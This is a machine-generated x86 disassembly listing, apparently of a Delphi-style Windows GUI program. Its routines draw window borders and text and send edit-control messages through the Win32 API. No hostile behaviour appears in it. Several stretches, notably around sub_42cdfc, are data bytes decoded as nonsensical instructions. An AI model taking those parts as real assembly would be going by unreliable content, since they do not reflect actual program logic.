mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c800
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c89c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42c8b9 ]
jmp [ eax * 4 + jump_table_42c922 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42cc28
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42cd83
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42c7c4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42c64c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412484
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42cdb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cdeb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cdf2
retn
mov eax [ rw-data ]
call sub_403128
mov eax rw-data
call sub_403e78
sub_42cdfc
add dh cl
inc edx
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
lds eax [ ebx ]
pushfd
insb
inc ebx
add [ eax + 0x3e740043 ] dl
inc ecx
dec esp
popad
jns r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
je r-xdata
inc ebx
jne r-xdata
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
lds eax [ ebx ]
pushfd
insb
inc ebx
add [ eax + 0x3e740043 ] dl
inc ecx
add [ eax ] bh
fild [ edx ]
and ch bl
inc edx
add al dh
aas
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd8200041 0x42
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ eax - 0x24 ] al
inc edx
add [ edi + edi + 0x4b100043 ] bh
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ edx + ebx * 8 ] bh
inc edx
add [ eax + 0x60042d8 ] bh
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
insb
rol [ edx ] 0x1
pop es
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
int3
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
pop esp
iretd
xor [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
int 0x42
add [ 0x6f546c74 ] al
jo r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
inc ecx
add al ah
xchg esi eax
inc ecx
clc
cdq
outsd
insd
add [ eax ] bh
fild [ edx ]
add [ esi + edi + 0x41 ] dh
inc ebx
outsb
je r-xdata
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd8200041 0x42
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ eax - 0x24 ] al
inc edx
add [ edi + edi + 0x4b100043 ] bh
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ edx + ebx * 8 ] bh
inc edx
add [ eax + 0x70042d8 ] bh
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
call [ eax - 0x23 ]
inc edx
add [ ebp + ebx * 8 + 0x42 ] ch
add [ ebp + ebx * 8 - 0x21dfffbe ] al
inc edx
add [ esi + ebx * 8 + 0x42 ] al
add [ ebx + ebx * 8 + 0x42 ] dl
add ah cl
fadd [ edx ]
or al 0x54
inc ebx
jne r-xdata
insb
jae r-xdata
pushad
inc ebx
jb r-xdata
inc esi
add al ch
push ebp
arpl bp di
mov dh cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 ] bl
inc edx
add [ eax - 0x31 ] cl
inc edx
add [ ecx + eax + 0x10380000 ] cl
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
je r-xdata
and ch bl
inc edx
add al dh
aas
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
outsd
je r-xdata
inc edx
sub_42d8cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42da22
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_436e88
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d39c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404140
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c55c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c55c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da29
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_42da33
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_42dc5c
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41ce64
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41cd48
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41ce64
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d120
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403324
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403324
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_42db54
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d520
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403324
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d520
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_431940
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_42dc98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42dc5c
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dcf8
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403324
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dd20
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_434084
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_42dd84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42de11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de18
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434bb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44c68c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_42de68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4370bc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_434370
mov edx 0x19
mov eax esi
call sub_434394
mov dl 0x1
mov eax esi
call sub_43b5c4
xor edx edx
mov eax esi
call sub_434d78
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_42e4d0
mov eax esi
test bl bl
je r-xdata
sub_42df10
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42df68
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_42df98
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_43b694
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_43b390
push eax
call SendMessageA
test eax eax
setne bl
sub_42dfd0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43b694
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_43b390
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e008
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_43b694
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_43b390
push eax
call SendMessageA
sub_42e044
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_42e068
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e088
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42e0b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b390
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_43b390
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42e170
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_434b28
inc eax
call sub_4085a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42e1fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4085bc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_434b38
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e201
mov eax [ ebp - 0xc ]
call sub_4085f4
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_42e20c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_403f68
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_434b28
inc eax
call sub_4085a8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e29a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4085bc
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_434b38
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4085f4
retn
sub_42e2a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43821c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_438148
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42e361
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_438518
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_438518
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_42e3d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_42e413
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_438348
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e41a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_42e41a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_42dfd0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e494
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SendMessageA
sub_42e494
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_42e4d0
pop ebx
retn
sub_42e4d0
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c570
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
